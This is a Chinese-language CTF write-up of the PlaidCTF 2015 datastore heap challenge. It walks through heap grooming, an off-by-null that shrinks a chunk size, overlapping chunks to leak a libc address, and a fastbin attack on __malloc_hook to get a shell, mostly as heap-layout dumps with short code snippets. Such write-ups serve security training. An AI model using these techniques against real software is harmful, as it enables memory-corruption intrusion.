## step1

首先为了做大chunk的物理相邻，首先先申请一些小块给除了data之外的使用。

```python
for i in range(10):
    put(str(i), 1, str(i))
for i in range(10):
    dele(str(i))
```

堆布局：

```c
Free chunk (fastbins) | PREV_INUSE	#a
Addr: 0x5b89dcd2e6e0
Size: 0x80 (with flag bits: 0x81)
fd: 0x00

Free chunk (unsortedbin) | PREV_INUSE	#b
Addr: 0x5b89dcd2e760
Size: 0x110 (with flag bits: 0x111)
fd: 0x743374fc3b78
bk: 0x743374fc3b78

Allocated chunk	#c
Addr: 0x5b89dcd2e870
Size: 0x90 (with flag bits: 0x90)

Allocated chunk | PREV_INUSE	#d
Addr: 0x5b89dcd2e900
Size: 0x90 (with flag bits: 0x91)
```

## step2

申请多块chunk，data部分填充大小为`0x80->0x110->0x90->0x90`（物理相邻），然后释放0x80和0x110大小的chunk，通过`PUT(b'E'*0x78,0x11,b'a'*0x10) `，触发off-by-null，把0x111大小给改为0x100。

**如果这里不进行off-by-null，剩下的0x100-0x90-0x50=0x20大小的chunk会进行向上合并，导致错误发生**。

```c
Allocated chunk | PREV_INUSE
Addr: 0x5d5ca7a786e0
Size: 0x80 (with flag bits: 0x81)

Free chunk (unsortedbin)
Addr: 0x5d5ca7a78760
Size: 0x100 (with flag bits: 0x100)
fd: 0x78783f3c3b78
bk: 0x78783f3c3b78

Allocated chunk | IS_MMAPED	（这里不是topchunk，进行溢出之后会发生heap显示问题，实际上和上面比较是留出了0x10大小的空间）
Addr: 0x5d5ca7a78860
Size: 0x4242424242424240 (with flag bits: 0x4242424242424242)
    
Allocated chunk	#c
Addr: 0x5b89dcd2e870
Size: 0x90 (with flag bits: 0x90)

Allocated chunk | PREV_INUSE	#d
Addr: 0x5b89dcd2e900
Size: 0x90 (with flag bits: 0x91)
```

## step3

申请B1和B2然后释放B1和C，导致以下的布局。主要是为了产生B2chunk。

```c
Allocated chunk | PREV_INUSE	#a
Addr: 0x63bd2cdad6e0
Size: 0x80 (with flag bits: 0x81)

Allocated chunk | PREV_INUSE	#b1释放
Addr: 0x63bd2cdad760
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE	#b2
Addr: 0x63bd2cdad7f0
Size: 0x50 (with flag bits: 0x51)

Free chunk (unsortedbin) | PREV_INUSE	#unused
Addr: 0x63bd2cdad840
Size: 0x20 (with flag bits: 0x21)
fd: 0x7c5e83dc3b78
bk: 0x7c5e83dc3b78

Allocated chunk	 #c
Addr: 0x63bd2cdad870
Size: 0x90 (with flag bits: 0x90)
```

## step4

填满B1然后再次释放之后，B2会被放入unsorted bin中，这时候就可以泄露libc地址。

```c
Allocated chunk | PREV_INUSE	#a
Addr: 0x63bd2cdad6e0
Size: 0x80 (with flag bits: 0x81)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x63bd2cdad760
Size: 0x1a0 (with flag bits: 0x1a1)
fd: 0x63bd2cdad840
bk: 0x7c5e83dc3b78

Allocated chunk	#d
Addr: 0x63bd2cdad900
Size: 0x90 (with flag bits: 0x90)
```

## step5

修改bin2的大小，进行fastbin attack然后进行malloc_hook攻击，getshell。

## Difficulty

4

## Other

[2015 plaidctf datastore(off by one)-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-246966.htm)

[off-null-byte-plaiddb_plaidctf2015 plaiddb-CSDN博客](https://blog.csdn.net/csdn546229768/article/details/122567854?ops_request_misc=%7B%22request%5Fid%22%3A%226a7fdfc67e0a1b8c53b54fa267c89945%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=6a7fdfc67e0a1b8c53b54fa267c89945&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122567854-null-null.142^v100^pc_search_result_base3&utm_term=plaiddb&spm=1018.2226.3001.4187)

